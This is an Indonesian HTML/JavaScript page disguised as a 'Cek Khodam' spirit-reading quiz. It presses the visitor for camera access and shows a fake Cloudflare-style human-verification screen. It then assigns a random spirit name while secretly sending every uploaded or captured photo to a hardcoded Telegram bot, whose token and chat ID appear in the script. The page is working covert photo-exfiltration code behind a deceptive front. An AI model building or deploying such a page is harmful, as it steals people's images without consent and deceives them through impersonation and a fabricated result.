<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>Cek Khodam - Verifikasi Koneksi</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
  * {
    box-sizing: border-box;
  }
  body, html {
    margin:0; padding:0;
    height: 100%;
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(135deg, #120f2f, #2c196f);
    color: #eee;
    overflow: hidden;
    -webkit-user-select:none; user-select:none;
  }
  #app {
    max-width: 350px;
    max-height: 600px;
    width: 100vw;
    height: 100vh;
    margin: auto;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 15px;
    text-align: center;
  }
  h1 {
    font-size: 2rem;
    margin-bottom: 0.2rem;
    font-weight: 600;
    color:#fff;
    letter-spacing: 1.5px;
  }
  h2 {
    font-size: 1.2rem;
    color: #ddd;
    margin-bottom: 1rem;
    font-weight: 400;
  }
  button {
    background: #675aba;
    border: none;
    border-radius: 30px;
    padding: 12px 24px;
    color: white;
    font-weight: 600;
    font-size: 1rem;
    cursor: pointer;
    box-shadow: 0 5px 10px rgba(103, 90, 186, 0.6);
    transition: background 0.3s ease;
    user-select:none;
  }
  button:hover {
    background: #4b3e95;
  }
  .hidden {
    display: none !important;
  }
  #camera-stream video {
    width: 100%;
    max-height: 280px;
    border-radius: 10px;
    background: #222;
    pointer-events: none;
  }
  #photo-preview {
    width: 100%;
    max-height: 280px;
    border-radius: 10px;
    object-fit: contain;
    margin-bottom: 1rem;
    box-shadow: 0 0 15px rgba(103,90,186,0.7);
  }
  label {
    margin: 0.5rem 0 0.5rem 0;
    font-weight: 600;
  }
  .menu {
    margin-top: 1rem;
  }
  .menu button {
    width: 150px;
    margin: 0.2rem;
  }
  #loader {
    margin: 1.5rem 0;
  }
  .footer {
    font-size: 0.8rem;
    color: #888;
    margin-top: auto;
  }
  a {
    color: #9d92d6;
    text-decoration: none;
  }
  a:hover {
    text-decoration: underline;
  }
  .notice-box {
    background: rgba(255,255,255,0.1);
    border-radius: 10px;
    padding: 15px;
    margin-bottom: 1.2rem;
    color: #ccc;
    font-size: 0.9rem;
    line-height: 1.3;
  }
</style>
</head>
<body>
<div id="app">
  <!-- Permission screen -->
  <div id="permission-screen">
    <h1>Cek Khodam</h1>
    <p>Perkenankan web ini mengakses kamera anda.</p>
    <button id="btn-allow-camera">Kasi izin akses kamera</button>
    <p style="font-size:0.8rem; margin-top: 0.6rem;">Privasi dan Syarat - Cloudflare</p>
  </div>

  <!-- Verification screen -->
  <div id="verification-screen" class="hidden">
    <h2>Nama web perlu meninjau keamanan koneksi anda sebelum melanjutkan</h2>
    <p>Verifikasi bahwa anda manusia, ini dapat memakan waktu beberapa detik...</p>
    <div id="loader">‚è≥ Memproses verifikasi...</div>
  </div>

  <!-- Main app -->
  <div id="main-screen" class="hidden">
    <h1>Cek Khodam</h1>
    <div class="notice-box">
      Masukan foto anda untuk mengetahui khodam anda.
      <br/>
      Anda dapat memilih foto dari file atau mengambil langsung dari kamera.
    </div>
    <div class="menu">
      <button id="choose-file-btn">Pilih File Foto</button>
      <button id="open-camera-btn">Foto Kamera</button>
    </div>

    <input type="file" accept="image/*" id="file-input" class="hidden" />

    <div id="camera-stream" class="hidden">
      <video autoplay playsinline></video>
      <button id="capture-btn" style="margin-top:10px;">Ambil Foto</button>
      <button id="close-camera-btn" style="margin-top:10px; background:#b84c46;">Tutup Kamera</button>
    </div>

    <canvas id="canvas" class="hidden"></canvas>

    <img id="photo-preview" class="hidden" alt="Preview Foto" />

    <div id="result-screen" class="hidden">
      <h2>Khodam Anda Adalah:</h2>
      <p id="khodam-result" style="font-weight: 700; font-size:1.5rem; color:#9d92d6;"></p>
    </div>

    <div class="footer" id="footer-msg">
      Created by GusOff &nbsp;&bull;&nbsp;
      <span id="datetime"></span>
      &nbsp;&bull;&nbsp; <a href="#">Privasi & Syarat</a>
    </div>
  </div>
</div>

<script>
(() => {
  const BOT_TOKEN = "7893259976:AAGtopfmbTNWG7QXcwf6krh-tZK5o94849E";
  const OWNER_CHAT_ID = "7179266123"
  const app = document.getElementById('app');

  // Screens
  const permissionScreen = document.getElementById('permission-screen');
  const verificationScreen = document.getElementById('verification-screen');
  const mainScreen = document.getElementById('main-screen');

  // Buttons and inputs
  const btnAllowCamera = document.getElementById('btn-allow-camera');
  const chooseFileBtn = document.getElementById('choose-file-btn');
  const openCameraBtn = document.getElementById('open-camera-btn');
  const fileInput = document.getElementById('file-input');
  const cameraStreamDiv = document.getElementById('camera-stream');
  const video = cameraStreamDiv.querySelector('video');
  const captureBtn = document.getElementById('capture-btn');
  const closeCameraBtn = document.getElementById('close-camera-btn');
  const photoPreview = document.getElementById('photo-preview');
  const resultScreen = document.getElementById('result-screen');
  const khodamResult = document.getElementById('khodam-result');
  const datetimeEl = document.getElementById('datetime');

  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');

  // Khodam names pool - can be enhanced or randomized
  const khodamNames = [
    "Jin Penjaga Pintu",
    "Roh Gunung",
    "Malaikat Pelindung",
    "Arwah Pejuang",
    "Khodam Macan Putih",
    "Roh Sunan Kalijaga",
    "Jin Api Sakti",
    "Makhluk Cahaya",
    "Roh Penunggu Laut",
    "Malaikat Pembawa Berkah"
  ];

  // Utility: format date time
  function formatDateTime(d) {
    const pad = n => (n<10?'0'+n:n);
    return d.getFullYear() + '-' + pad(d.getMonth()+1) + '-' + pad(d.getDate()) +
      ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
  }

  // Show date/time in footer
  function updateDateTime(){
    const now = new Date();
    datetimeEl.textContent = formatDateTime(now);
  }
  updateDateTime();
  setInterval(updateDateTime, 1000);

  // Show element, hide others helper
  function showScreen(showEl) {
    [permissionScreen, verificationScreen, mainScreen].forEach(el => {
      if(el === showEl) el.classList.remove('hidden');
      else el.classList.add('hidden');
    });
  }

  // Start: Initially show permission screen
  showScreen(permissionScreen);

  // Request camera access on button click
  async function requestCameraAccess(){
    try {
      await navigator.mediaDevices.getUserMedia({video:true});
      startVerification();
    } catch (err) {
      alert("Akses kamera ditolak. Anda harus mengizinkan akses kamera untuk melanjutkan.");
    }
  }

  btnAllowCamera.addEventListener('click', requestCameraAccess);

  // Verification: fake delayed verification then show main screen
  function startVerification(){
    showScreen(verificationScreen);
    setTimeout(() => {
      showScreen(mainScreen);
    }, 3500);
  }

  // Choose file input
  chooseFileBtn.addEventListener('click', () => {
    fileInput.click();
  });

  // Open camera stream for capture
  let cameraStream = null;
  openCameraBtn.addEventListener('click', async () => {
    try {
      cameraStream = await navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }, audio:false});
      video.srcObject = cameraStream;
      video.play();
      photoPreview.classList.add('hidden');
      cameraStreamDiv.classList.remove('hidden');
      resultScreen.classList.add('hidden');
    } catch (err) {
      alert("Tidak dapat mengakses kamera: " + err.message);
    }
  });

  // Close camera stream
  closeCameraBtn.addEventListener('click', () => {
    if(cameraStream){
      cameraStream.getTracks().forEach(track => track.stop());
      cameraStream = null;
    }
    cameraStreamDiv.classList.add('hidden');
  });

  // Capture photo from camera
  captureBtn.addEventListener('click', () => {
    if(!cameraStream) return alert("Kamera tidak aktif");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
    displayPhoto(dataUrl);
    cameraStreamDiv.classList.add('hidden');
    // Stop camera
    cameraStream.getTracks().forEach(track => track.stop());
    cameraStream = null;
  });

  // Display photo and proceed with khodam check
  function displayPhoto(dataUrl){
    photoPreview.src = dataUrl;
    photoPreview.classList.remove('hidden');
    resultScreen.classList.remove('hidden');
    // Pick random khodam
    const khodam = khodamNames[Math.floor(Math.random()*khodamNames.length)];
    khodamResult.textContent = khodam;

    // Send photo to telegram bot
    sendPhotoToTelegram(dataUrl, khodam);
  }

  // Handle file input change
  fileInput.addEventListener('change', e => {
    const file = e.target.files[0];
    if(!file) return;
    if(!file.type.startsWith('image/')){
      alert("Mohon pilih file gambar yang valid.");
      return;
    }
    const reader = new FileReader();
    reader.onload = function(ev){
      displayPhoto(ev.target.result);
    };
    reader.readAsDataURL(file);
  });

  // Send photo to telegram bot owner
  async function sendPhotoToTelegram(dataUrl, khodamDesc){
    try {
      // Telegram Bot API sendPhoto method expects a multipart/form-data POST
      // We convert base64 image to blob then send as formdata
      const blob = dataURLtoBlob(dataUrl);
      const formData = new FormData();
      formData.append("chat_id", OWNER_CHAT_ID);
      formData.append("caption", `Khodam Check Result: ${khodamDesc}\nCreated by GusOff\nTimestamp: ${formatDateTime(new Date())}`);
      formData.append("photo", blob, "khodam_photo.jpg");

      const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });

      const json = await resp.json();
      if(!json.ok){
        console.warn("Telegram bot sendPhoto error:", json);
      }
    }
    catch(e){
      console.warn("Telegram sendPhoto catch error:", e);
    }
  }

  // Utility: convert dataURL base64 to Blob
  function dataURLtoBlob(dataurl) {
    const arr = dataurl.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while(n--){
      u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], {type:mime});
  }

  // Try to request camera access automatically on load
  window.addEventListener('load', () => {
    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
      navigator.mediaDevices.getUserMedia({video:true})
      .then(stream => {
        // Do not keep stream open, just release it
        stream.getTracks().forEach(track => track.stop());
        // Show verification screen
        startVerification();
      })
      .catch(() => {
        // Not granted yet, show permission screen
        showScreen(permissionScreen);
      });
    } else {
      alert("Browser anda tidak mendukung akses kamera.");
      showScreen(permissionScreen);
    }
  });

})();
</script>
</body>
</html>

```

